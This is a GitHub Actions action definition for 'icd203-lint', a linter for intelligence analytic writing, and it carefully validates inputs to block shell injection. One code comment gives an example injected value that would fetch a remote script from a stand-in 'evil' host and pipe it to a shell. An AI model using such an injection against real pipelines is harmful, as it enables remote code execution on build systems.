name: 'icd203-lint'
description: 'Lint analytic writing for ICD-203 violations: confidence, sourcing, attribution, hedging.'
author: 'Paul Goodwin'
branding:
  icon: 'check-circle'
  color: 'blue'

inputs:
  paths:
    description: 'Files or directories to lint. Space-separated. Defaults to the repository root.'
    required: false
    default: '.'
  severity:
    description: 'Severity floor (info, warn, error). Findings below this are not reported.'
    required: false
    default: 'warn'
  format:
    description: 'Output format. Use "github" for inline annotations, "sarif" for code scanning, "text" for logs.'
    required: false
    default: 'github'
  fail-on-findings:
    description: 'If true, the action fails when any finding is at or above the severity floor.'
    required: false
    default: 'true'
  select:
    description: 'Comma-separated list of rule ids to run exclusively.'
    required: false
    default: ''
  ignore:
    description: 'Comma-separated list of rule ids to skip.'
    required: false
    default: ''
  version:
    description: 'icd203-lint version to install (PyPI). Defaults to the latest.'
    required: false
    default: ''

runs:
  using: 'composite'
  steps:
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'

    # Every input is passed through `env:` and read as a shell variable, never
    # interpolated into the script text with ${{ }}. GitHub expands ${{ }} into
    # the run: body BEFORE bash runs, so a value like `1.0"; curl evil | sh; :"`
    # in an input would become live script. Reading the same value from the
    # environment (`$ICD203_VERSION`) hands bash a string, not source code:
    # parameter expansion does not re-run command substitution, so injected
    # metacharacters stay inert. Inputs are additionally validated below.
    - name: Install icd203-lint
      shell: bash
      env:
        ICD203_VERSION: ${{ inputs.version }}
      run: |
        set -euo pipefail
        if [ -n "$ICD203_VERSION" ]; then
          if ! printf '%s' "$ICD203_VERSION" | grep -Eq '^[A-Za-z0-9._-]+$'; then
            echo "::error::Invalid version '$ICD203_VERSION'. Allowed: letters, digits, dot, underscore, hyphen." >&2
            exit 1
          fi
          pip install "icd203-lint==$ICD203_VERSION"
        else
          pip install icd203-lint
        fi

    - name: Run icd203-lint
      shell: bash
      env:
        ICD203_PATHS: ${{ inputs.paths }}
        ICD203_SEVERITY: ${{ inputs.severity }}
        ICD203_FORMAT: ${{ inputs.format }}
        ICD203_SELECT: ${{ inputs.select }}
        ICD203_IGNORE: ${{ inputs.ignore }}
        ICD203_FAIL_ON_FINDINGS: ${{ inputs.fail-on-findings }}
      run: |
        set -uo pipefail

        # --- validate the enum / boolean inputs -----------------------------
        case "$ICD203_SEVERITY" in
          info|warn|error) ;;
          *) echo "::error::severity must be one of: info, warn, error (got '$ICD203_SEVERITY')." >&2; exit 1 ;;
        esac
        case "$ICD203_FORMAT" in
          github|sarif|text) ;;
          *) echo "::error::format must be one of: github, sarif, text (got '$ICD203_FORMAT')." >&2; exit 1 ;;
        esac
        case "$ICD203_FAIL_ON_FINDINGS" in
          true|false) ;;
          *) echo "::error::fail-on-findings must be 'true' or 'false' (got '$ICD203_FAIL_ON_FINDINGS')." >&2; exit 1 ;;
        esac

        # --- build argv as an array: each value is one argument, never re-parsed
        args=( --severity "$ICD203_SEVERITY" --format "$ICD203_FORMAT" )

        if [ -n "$ICD203_SELECT" ]; then
          IFS=',' read -ra sel <<< "$ICD203_SELECT"
          for raw in "${sel[@]}"; do
            [[ "$raw" =~ ^[[:space:]]*$ ]] && continue
            if [[ "$raw" =~ ^[[:space:]]*([A-Za-z0-9_-]+)[[:space:]]*$ ]]; then
              args+=( --select "${BASH_REMATCH[1]}" )
            else
              echo "::error::Invalid rule id in select: '$raw'. Allowed: letters, digits, underscore, hyphen." >&2
              exit 1
            fi
          done
        fi

        if [ -n "$ICD203_IGNORE" ]; then
          IFS=',' read -ra ign <<< "$ICD203_IGNORE"
          for raw in "${ign[@]}"; do
            [[ "$raw" =~ ^[[:space:]]*$ ]] && continue
            if [[ "$raw" =~ ^[[:space:]]*([A-Za-z0-9_-]+)[[:space:]]*$ ]]; then
              args+=( --ignore "${BASH_REMATCH[1]}" )
            else
              echo "::error::Invalid rule id in ignore: '$raw'. Allowed: letters, digits, underscore, hyphen." >&2
              exit 1
            fi
          done
        fi

        # paths is a space-separated list; split into argv without glob surprises.
        set -f
        read -ra path_args <<< "$ICD203_PATHS"
        set +f
        if [ "${#path_args[@]}" -eq 0 ]; then
          path_args=( "." )
        fi

        set +e
        icd203-lint "${path_args[@]}" "${args[@]}"
        rc=$?
        set -e

        if [ "$ICD203_FAIL_ON_FINDINGS" = "true" ] && [ "$rc" -ne 0 ]; then
          exit "$rc"
        fi
        exit 0
